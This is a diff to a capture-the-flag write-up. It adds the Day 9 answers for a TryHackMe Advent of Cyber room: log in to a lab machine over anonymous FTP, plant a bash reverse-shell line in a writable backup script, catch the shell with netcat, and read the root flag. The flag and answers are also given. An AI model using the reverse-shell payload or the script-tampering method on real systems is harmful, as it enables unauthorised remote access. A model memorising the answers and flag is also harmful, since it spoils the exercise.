@@ -16,7 +16,7 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 - [[Day 6] Be careful with what you wish on a Christmas night](#day-6-be-careful-with-what-you-wish-on-a-christmas-night)
 - [[Day 7] The Grinch Really Did Steal Christmas](#day-7-the-grinch-really-did-steal-christmas)
 - [[Day 8] What's Under the Christmas Tree?](#day-8=whats-under-the-christmas-tree)
-- [[Day 9] ](#day-9-)
+- [[Day 9] Anyone can be Santa!](#day-9-anyone-can-be-santa)
 - [[Day 10] ](#day-10-)
 - [[Day 11] ](#day-11-)
 - [[Day 12] ](#day-12-)
@@ -442,13 +442,63 @@ In this task we will be using `nmap` to find more information on the target mach
    ![Nmap Scipts](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2008/Christmas_Tree_Nmap_Scripts.png)
 
 
-### [Day 9] []()
+### [Day 9] [Anyone can be Santa!](https://github.com/Kevinovitz/TryHackMe_Writeups/tree/main/adventofcyber2/Day%2009)
 
 
 
-1. 
+1. Name the directory on the FTP server that has data accessible by the "anonymous" user
 
-   ><details><summary>Click for answer</summary></details>
+   To connect to the machine through FTP we can use the following command:
+   
+   ```cmd
+   ftp 10.10.210.253
+   ```
+   
+   Then we can try logging is as user anonymous. Looks like we can indeed log in this way. Using `ls -lh` we can see the available directories.
+   
+   ![FTP Directory](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_FTP_Directory.png)
+
+   ><details><summary>Click for answer</summary>public</details>
+
+2. What script gets executed within this directory?
+
+   Navigating into this directory we can see two files. One of which is probably the script that gets executed. Lets download it for the next question using: `get backup.sh`.
+   
+   ![FTP Get](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_FTP_Get.png)
+
+   ><details><summary>Click for answer</summary>backup.sh</details>
+
+3. What movie did Santa have on his Christmas shopping list?
+
+   Using the same command as previously `get shoppinglist.txt` we can download the shopping list and open its content.
+   
+   ![Santa Movie](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Movie.png)
+
+   ><details><summary>Click for answer</summary>The Polar Express</details>
+
+4. Re-upload this script to contain malicious data (just like we did in section 9.6. Output the contents of /root/flag.txt!
+
+   First we need to add our malicious payload to the script. From the [Cheat sheet]() we can add the following to our script to get us a reverse shell. We need to add our IP address (with the VPN in this case) and a port for us to listen on.
+   
+   ```cmd
+   bash -i >& /dev/tcp/10.18.78.136/1337 0>&1
+   ```
+   
+   ![Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Script.png)
+   
+   Now we can upload the script back to the server with `put backup.sh`. Then we must open up a listener on the correct port and wait for the script to execute on the server.
+   
+   ```cmd
+   nc -nlvp 1337
+   ```
+   
+   ![Reverse Shell](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Reverse_Shell.png)
+   
+   As soon as we have our shell, we can navigate to the flag and view its contents.
+   
+   ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2009/Be_Santa_Flag.png)
+
+   ><details><summary>Click for answer</summary>THM{even_you_can_be_santa}</details>
 
 ### [Day 10] []()
 
